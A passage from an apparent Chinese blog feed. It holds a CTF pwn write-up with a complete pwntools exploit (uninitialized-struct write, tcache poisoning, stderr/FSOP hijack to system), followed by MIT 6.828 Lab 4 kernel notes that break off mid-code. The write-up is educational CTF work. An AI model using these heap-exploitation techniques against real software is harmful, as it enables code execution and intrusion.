src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192038807.png"></p><p>该函数使用如下的结构.算法首先创建了一个PathInfo的数组dist(存储路径信息)和一个S_set集合(记录一个结点是否已经以其为源点进行过广搜).<br>manager中的bottom_idx和top_idx,用作dist数组的索引.可以理解为双指针(形成的队列).<br>每搜到一个结点,<code>无论是否已经由其他点出发搜到过</code>,将该路径信息存到dist[top_idx]中.top_idx++.每以一个结点为源点开始搜索,将dist[bottom_idx]取出存到栈上的path,进行计算操作,bottom_idx++.这样top_idx和bottom_idx之间的PathInfo,就是已搜到但还未以其为源点搜索的结点(其实是路径信息).直到top_idx==bottom_idx,完成广搜.</p><p>不过有一个问题,dist数组只分配了node_count+1个PathInfo,而算法是每搜到一个结点,<code>无论是否已经由其他点出发搜到过</code>,将该路径信息存到dist数组中,所以存在溢出.构造一个图,其中一个结点有很多条入边,可以Poc出这个漏洞.</p><p>但我没有往这方面走,因为有另一个洞更吸引我注意.这个洞在逆向过程中很容易发现:<del>啊啊啊这两个__int64到底是啥啊也没初始化啊啊</del>.嗯哼,manager结构没有初始化.我们可以提前布置一个堆块伪造manager结构并释放,在short的时候取出,将其作为manager,由于tcache取出时对key的清0,bottom_idx的初始值一定为0.我们仅能控制top_idx.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192044234.png"></p><p>看看怎么利用.可以发现在进入循环之前的深搜初始化工作,将起点存到dist[top_idx]中,其中src_key是我们可控的,于是便有了dist+top_idx*0x18+8地址处的8字节任意写.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192111186.png"></p><p>别高兴太早,这样破坏内存的行为很容易导致程序崩溃.<br>橙色框中是容易导致崩溃的地方(还有内循环的store_dist函数).尝试通过黄色框中的条件绕过:第一个比较是无符号比较,无法通过负数绕过.第二个比较的cur_key不可控,无法绕过.gg<br>于是为了避免崩溃,我们的top_idx只能为一个较小数,只能完成在堆上的近似任意写(近似是因为有0x18倍数的要求).那就劫持tcache然后改stderr,再利用offbynull清空topchunk触发malloc_assert.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192115313.png"></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>唉,最喜欢的调堆环节.<br>我知道exp里结点编号很乱…调完风水懒得改了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p.init(io,e,libc)</span><br><span class="line"></span><br><span class="line">promt = <span class="string">":"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(option))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">src,dst,size,content,val</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(promt,content)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(val))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">short</span>(<span class="params">src,dst,step</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(step))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">src,dst</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">src,dst</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line"></span><br><span class="line">lg = <span class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive() <span class="keyword">if</span> io.connected() <span class="keyword">else</span> io.close()</span><br><span class="line">one_gadget = <span class="keyword">lambda</span> filename=LIBC: <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split()))</span><br><span class="line">dbg = <span class="keyword">lambda</span>: gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x40</span>,<span class="number">0xC0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来的dist块</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">13</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来用来劫持的tcache</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">12</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>) <span class="comment">#将来用来劫持的tcache</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x40</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)<span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#填满tcache,得到unsortedbin</span></span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">11</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">12</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">13</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">0x40</span>,<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">0x40</span>,<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#放进tcache取出拿堆地址</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">heap_base = p.demangle(p.recvaddress(<span class="string">'bytes'</span>))-<span class="number">0xb60</span></span><br><span class="line">lg(<span class="string">"heap_base"</span>,heap_base)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#切割unsortedbin拿libc_base</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0x18</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x219dd0</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">target = p.libc_base+libc.sym[<span class="string">'stderr'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(p.mangle(heap_base+<span class="number">0x900</span>,target),<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#布置未初始化内存留给short用,0x11为top_idx,劫持tcache的next指针</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,p.p48(<span class="number">0x11</span>),<span class="string">b'\n'</span>])</span><br><span class="line">add(<span class="number">10</span>,<span class="number">11</span>,<span class="number">0x18</span>,payload,<span class="string">b'\n'</span>)</span><br><span class="line">delete(<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#触发任意写</span></span><br><span class="line">short(p.mangle(heap_base+<span class="number">0x900</span>,target),<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#准备FSOP</span></span><br><span class="line">payload = p.obstack_attack(heap_base+<span class="number">0xb50</span>,{<span class="string">'system'</span>:p.system_addr,<span class="string">'io_obstack_jumps'</span>:p.libc_base+<span class="number">0x2163c0</span>})+<span class="string">b'\n'</span></span><br><span class="line"><span class="comment"># print(hex(len(payload)))</span></span><br><span class="line">add(<span class="number">520</span>,<span class="number">1314</span>,<span class="number">0xf0</span>,payload,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#劫持stderr指针</span></span><br><span class="line">add(<span class="number">20</span>,<span class="number">21</span>,<span class="number">0x40</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">20</span>,<span class="number">23</span>,<span class="number">0x40</span>,p64(heap_base+<span class="number">0xb50</span>)+<span class="string">b'\n'</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#准备malloc_assert</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">394</span>):</span><br><span class="line">    add(<span class="number">520</span>,<span class="number">1000</span>+i,<span class="number">0xf0</span>,<span class="string">'\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">520</span>,<span class="number">998</span>,<span class="number">0xf0</span>,<span class="string">'a\n'</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">520</span>,<span class="number">999</span>,<span class="number">0xa8</span>,<span class="string">'a'</span>*<span class="number">0xa8</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#触发malloc_assert</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(promt,<span class="built_in">str</span>(<span class="number">114514</span>))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">p.recvflag()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab4</title>
      <link href="/2023/6.828-Lab4/"/>
      <url>/2023/6.828-Lab4/</url>
      
        <content type="html"><![CDATA[<h1 id="Lec-9"><a href="#Lec-9" class="headerlink" title="Lec 9"></a>Lec 9</h1><h2 id="“Locking”"><a href="#“Locking”" class="headerlink" title="“Locking”"></a>“Locking”</h2><blockquote><p>When we say that a lock protects data, we really mean that the lock protects some<br>collection of invariants that apply to the data. Invariants are properties of data struc-<br>tures that are maintained across operations. Typically, an operation’s correct behavior<br>depends on the invariants being true when the operation begins. The operation may<br>temporarily violate the invariants but must reestablish them before finishing. For ex-<br>ample, in the linked list case, the invariant is that list points at the first node in the<br>list and that each node’s next field points at the next node. The implementation of<br>insert violates this invariant temporarily: in line 15, l points to the next list element,<br>but list does not point at l yet (reestablished at line 16). The race condition we ex-<br>amined above happened because a second CPU executed code that depended on the<br>list invariants while they were (temporarily) violated. Proper use of a lock ensures that<br>only one CPU at a time can operate on the data structure in the critical section, so<br>that no CPU will execute a data structure operation when the data structure’s invari-<br>ants do not hold.</p></blockquote><span id="more"></span><blockquote><p>You can think of locks as serializing concurrent critical sections so that they run<br>one at a time, and thus preserve invariants (assuming they are correct in isolation).<br>You can also think of critical sections as being atomic with respect to each other, so<br>that a critical section that obtains the lock later sees only the complete set of changes<br>from earlier critical sections, and never sees partially-completed updates.</p></blockquote><h2 id="Lab-4-Preemptive-Multitasking"><a href="#Lab-4-Preemptive-Multitasking" class="headerlink" title="Lab 4: Preemptive Multitasking"></a>Lab 4: Preemptive Multitasking</h2><h3 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking"><a href="#Part-A-Multiprocessor-Support-and-Cooperative-Multitasking" class="headerlink" title="Part A: Multiprocessor Support and Cooperative Multitasking"></a>Part A: Multiprocessor Support and Cooperative Multitasking</h3><h4 id="Multiprocessor-Support"><a href="#Multiprocessor-Support" class="headerlink" title="Multiprocessor Support"></a>Multiprocessor Support</h4><p>对称多处理器模型(SMP):<br>引导处理器 （BSP） 负责初始化系统和引导操作系统;应用处理器 （AP） 仅在操作系统启动并运行后由 BSP 激活。哪个处理器是 BSP 由硬件和 BIOS 决定。</p><blockquote><p>We are going to make JOS support “symmetric multiprocessing” (SMP), a multiprocessor model in which all CPUs have equivalent access to system resources such as memory and I/O buses. While all CPUs are functionally identical in SMP, during the boot process they can be classified into two types: the bootstrap processor (BSP) is responsible for initializing the system and for booting the operating system; and the application processors (APs) are activated by the BSP only after the operating system is up and running. Which processor is the BSP is determined by the hardware and the BIOS.</p></blockquote><p>每个CPU有个LAPIC单元,LAPIC单元负责在整个系统中传输中断</p><blockquote><p>In an SMP system, each CPU has an accompanying local APIC (LAPIC) unit. The LAPIC units are responsible for delivering interrupts throughout the system. The LAPIC also provides its connected CPU with a unique identifier. </p></blockquote><h5 id="Per-CPU-State-and-Initialization"><a href="#Per-CPU-State-and-Initialization" class="headerlink" title="Per-CPU State and Initialization"></a>Per-CPU State and Initialization</h5><p>映射MMIO.</p><blockquote><p>A processor accesses its LAPIC using memory-mapped I/O (MMIO). In MMIO, a portion of physical memory is hardwired to the registers of some I/O devices, so the same load/store instructions typically used to access memory can be used to access device registers. You’ve already seen one IO hole at physical address 0xA0000 (we use this to write to the VGA display buffer).</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Reserve size bytes in the MMIO region and map [pa,pa+size) at this</span></span><br><span class="line"><span class="comment">// location.  Return the base of the reserved region.  size does *not*</span></span><br><span class="line"><span class="comment">// have to be multiple of PGSIZE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">mmio_map_region</span><span class="params">(<span class="type">physaddr_t</span> pa, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> base = MMIOBASE;</span><br><span class="line"></span><br><span class="line">size = ROUNDUP(size,PGSIZE);</span><br><span class="line">pa = ROUNDDOWN(pa,PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base + size &gt; MMIOLIM)</span><br><span class="line">        panic(<span class="string">"mmio_map_region: cannot go higher than MMIOLIM!\n"</span>);</span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir,base,size,pa,PTE_PCD|PTE_PWT|PTE_W);</span><br><span class="line">base += size;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">void</span>*)(base-size);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>为每一个cpu映射栈空间.<br>注意下方是NCPU而不是ncpu,因为ncpu此时还未初始化.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Modify mappings in kern_pgdir to support SMP</span></span><br><span class="line"><span class="comment">//   - Map the per-CPU stacks in the region [KSTACKTOP-PTSIZE, KSTACKTOP)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init_mp</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NCPU;++i)</span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> kstacktop_i = KSTACKTOP-i*(KSTKSIZE+KSTKGAP);</span><br><span class="line">boot_map_region(kern_pgdir,kstacktop_i-KSTKSIZE,KSTKSIZE,PADDR(percpu_kstacks[i]),PTE_W|PTE_P);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>为每个CPU设置tss,idr.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap_init_percpu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> id = cpunum();</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP-id*(KSTKGAP+KSTKSIZE);</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_iomb = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate);</span><br><span class="line"></span><br><span class="line">gdt[(GD_TSS0&gt;&gt;<span class="number">3</span>)+id] = SEG16(STS_T32A, (<span class="type">uint32_t</span>) (&amp;(thiscpu-&gt;cpu_ts)),</span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">gdt[(GD_TSS0&gt;&gt;<span class="number">3</span>)+id].sd_s = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// ltr(((GD_TSS0&gt;&gt;3)+id)&lt;&lt;3);</span></span><br><span class="line">ltr(GD_TSS0 + id*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Gatedesc));</span><br><span class="line">lidt(&amp;idt_pd);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下图有助于理解为什么gdt中使用cpt_ts的逻辑地址而不是物理地址，以及ltr操作的tss选择子.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082204791.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082204847.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082226355.png"></p><h4 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h4><h4 id="System-Calls-for-Environment-Creation"><a href="#System-Calls-for-Environment-Creation" class="headerlink" title="System Calls for Environment Creation"></a>System Calls for Environment Creation</h4><p>几个系统调用,需要检查的东西都列出来了,挨着做就行了.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate a new environment.</span></span><br><span class="line"><span class="comment">// Returns envid of new environment, or &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_NO_FREE_ENV if no free environment is available.</span></span><br><span class="line"><span class="comment">//-E_NO_MEM on memory exhaustion.</span></span><br><span class="line"><span class="type">static</span> <span class="type">envid_t</span></span><br><span class="line"><span class="title function_">sys_exofork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>((result = env_alloc(&amp;e,curenv-&gt;env_id)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;e-&gt;env_tf,&amp;curenv-&gt;env_tf,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe));</span><br><span class="line">e-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">e-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> e-&gt;env_id;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set envid's env_status to status, which must be ENV_RUNNABLE</span></span><br><span class="line"><span class="comment">// or ENV_NOT_RUNNABLE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if status is not a valid status for an environment.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_status</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">int</span> status)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span 